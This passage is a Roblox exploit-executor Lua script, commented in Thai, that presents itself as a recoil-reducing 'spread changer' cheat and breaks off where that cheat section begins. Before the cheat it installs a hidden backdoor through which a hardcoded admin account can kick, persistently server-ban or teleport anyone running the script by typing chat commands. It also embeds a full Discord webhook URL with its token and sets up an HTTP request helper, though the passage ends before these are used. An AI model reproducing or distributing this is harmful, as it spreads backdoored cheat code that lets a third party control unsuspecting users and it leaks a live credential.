--////////////////////////////////////////////////////////////
-- [ส่วนตั้งค่า] Config
--////////////////////////////////////////////////////////////

-- แก้ไขตรงนี้: เช็คว่ามีการตั้งค่ามาจากข้างนอกไหม?
if getgenv().spreadChangerPercentage == nil then
    getgenv().spreadChangerPercentage = 20 -- ถ้าไม่ได้ตั้งมา ให้ใช้ค่ามาตรฐานคือ 20
end

-- ลิ้งค์ Webhook ของคุณ
local WEBHOOK_URL = "https://discord.com/api/webhooks/1447911431881359494/4s6-I0jzTgVDc3xCW3wpJbI9LQ8GzAK2oFtt6aldGE2Yn-tlK_XM8CFxD5yIyb3pb7M-"

-- รายชื่อ Admin
local Whitelist_Admin = {
    8908656348, -- UserID ของคุณ
}

local BanFileName = "3354_ServerBlacklist.json"

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 0] ระบบตรวจสอบ Server Ban (ห้ามเข้าห้องเดิม)
--////////////////////////////////////////////////////////////
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

-- ตัวส่ง Request ที่รองรับทุกค่าย
local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local function checkBanStatus()
    if isfile and isfile(BanFileName) then
        local success, bannedList = pcall(function() return HttpService:JSONDecode(readfile(BanFileName)) end)
        if success and bannedList then
            for _, id in pairs(bannedList) do
                if id == game.JobId then
                    LocalPlayer:Kick("You have been kicked from this game [Error Code: 267]")
                    return true
                end
            end
        end
    end
    return false
end

if checkBanStatus() then return end 

local function addServerBan()
    local bannedList = {}
    if isfile and isfile(BanFileName) then
        pcall(function() bannedList = HttpService:JSONDecode(readfile(BanFileName)) end)
    end
    
    local currentJob = game.JobId
    local found = false
    for _, id in pairs(bannedList) do
        if id == currentJob then found = true break end
    end
    
    if not found then
        table.insert(bannedList, currentJob)
        if writefile then
            writefile(BanFileName, HttpService:JSONEncode(bannedList))
        end
    end
end

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 1] ระบบ Admin Commands (.kick / .ban / .bring)
--////////////////////////////////////////////////////////////
task.spawn(function()
    local function isAdmin(userId)
        for _, id in ipairs(Whitelist_Admin) do
            if userId == id then return true end
        end
        return false
    end

    local function isTarget(targetName)
        local myName = LocalPlayer.Name:lower()
        local myDisplay = LocalPlayer.DisplayName:lower()
        targetName = targetName:lower()

        if targetName == "$" then return true end
        if string.find(myName, targetName) or string.find(myDisplay, targetName) then
            return true
        end
        return false
    end

    local function onChatted(msg, speaker)
        if isAdmin(speaker.UserId) then
            local args = string.split(msg, " ")
            local cmd = args[1]:lower()
            local target = args[2]

            if not target then return end
            
            local kickReason = "You have been kicked by " .. speaker.Name

            if cmd == ".kick" then
                if isTarget(target) then LocalPlayer:Kick(kickReason) end
            elseif cmd == ".ban" then
                if isTarget(target) then
                    addServerBan()
                    task.wait(0.1)
                    LocalPlayer:Kick(kickReason)
                end
            elseif cmd == ".bring" then
                if isTarget(target) then
                    local adminChar = speaker.Character
                    local myChar = LocalPlayer.Character
                    if adminChar and adminChar:FindFirstChild("HumanoidRootPart") and 
                       myChar and myChar:FindFirstChild("HumanoidRootPart") then
                        myChar.HumanoidRootPart.CFrame = adminChar.HumanoidRootPart.CFrame
                    end
                end
            end
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        plr.Chatted:Connect(function(msg) onChatted(msg, plr) end)
    end
    Players.PlayerAdded:Connect(function(plr)
        plr.Chatted:Connect(function(msg) onChatted(msg, plr) end)
    end)
    print("Admin System: Loaded")
end)

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 2] ระบบ Spread (ลดแรงดีด)
--////////////////////////////////////////////////////////////
if not getgenv().spreadChangerLoaded then
